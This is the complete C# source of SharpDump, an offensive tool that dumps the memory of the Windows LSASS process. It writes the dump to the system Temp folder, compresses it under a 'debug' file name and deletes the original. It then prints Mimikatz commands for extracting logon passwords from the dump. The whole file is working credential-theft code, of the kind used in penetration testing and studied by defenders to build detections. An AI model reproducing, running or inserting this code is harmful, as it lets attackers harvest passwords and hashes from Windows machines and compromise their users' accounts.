using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SharpDump
{
    class Program
    {
        // partially adapted from https://blogs.msdn.microsoft.com/dondu/2010/10/24/writing-minidumps-in-c/

        // Overload supporting MiniDumpExceptionInformation == NULL
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void Compress(string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    Console.WriteLine("[X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception while compressing file: {0}", ex.Message);
            }
        }

        public static void Minidump(int pid = -1)
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                Process[] processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception ex)
                {
                    // often errors if we can't get a handle to LSASS
                    Console.WriteLine(String.Format("\n[X]Exception: {0}\n", ex.Message));
                    return;
                }
            }

            if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity())
            {
                Console.WriteLine("\n[X] Not in high integrity, unable to MiniDump!\n");
                return;
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                return;
            }
            bool bRet = false;

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
            string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);

            Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if(bRet)
            {
                Console.WriteLine("[+] Dump successful!");
                Console.WriteLine(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));

                Compress(dumpFile, zipFile);

                Console.WriteLine(String.Format("[*] Deleting {0}", dumpFile));
                File.Delete(dumpFile);
                Console.WriteLine("\n[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId);

                string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                string OS = "";
                var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
                if (regKey != null)
                {
                    OS = String.Format("{0}", regKey.GetValue("ProductName"));
                }

                if (pid == -1)
                {
                    Console.WriteLine(String.Format("\n[*] Operating System : {0}", OS));
                    Console.WriteLine(String.Format("[*] Architecture     : {0}", arch));
                    Console.WriteLine(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
                }
            }
            else
            {
                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
            }
        }

        static void Main(string[] args)
        {
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpDir = String.Format("{0}\\Temp\\", systemRoot);
            if (!Directory.Exists(dumpDir))
            {
                Console.WriteLine(String.Format("\n[X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
                return;
            }

            if (args.Length ==0)
            {
                // dump LSASS by default
                Minidump();
            }
            else if (args.Length == 1)
            {
                int retNum;
                if (int.TryParse(Convert.ToString(args[0]), System.Globalization.NumberStyles.Any, System.Globalization.NumberFormatInfo.InvariantInfo, out retNum))
                {
                    // arg is a number, so we're specifying a PID
                    Minidump(retNum);
                }
                else
                {
                    Console.WriteLine("\nPlease use \"SharpDump.exe [pid]\" format\n");
                }
            }
            else if (args.Length == 2)
            {
                Console.WriteLine("\nPlease use \"SharpDump.exe [pid]\" format\n");
            }
        }
    }
}
